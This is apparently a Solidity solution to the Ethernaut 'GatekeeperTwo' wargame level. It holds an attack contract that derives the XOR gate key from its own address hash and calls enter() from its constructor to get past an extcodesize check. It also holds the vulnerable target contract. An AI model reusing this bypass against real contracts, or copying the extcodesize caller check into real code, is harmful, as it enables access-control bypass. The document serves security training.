// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract HackKeeperTwo {
    GatekeeperTwo public immutable gatekeeper;
    uint64 public immutable intAddress;

    constructor(address _gatekeeper) {
        gatekeeper = GatekeeperTwo(_gatekeeper);
        intAddress = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        // intAddress ^ key = uint64.max
        // key = uint64.max ^ intAddress
        uint64 key = type(uint64).max ^ intAddress;
        gatekeeper.enter(bytes8(key));
    }
}

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
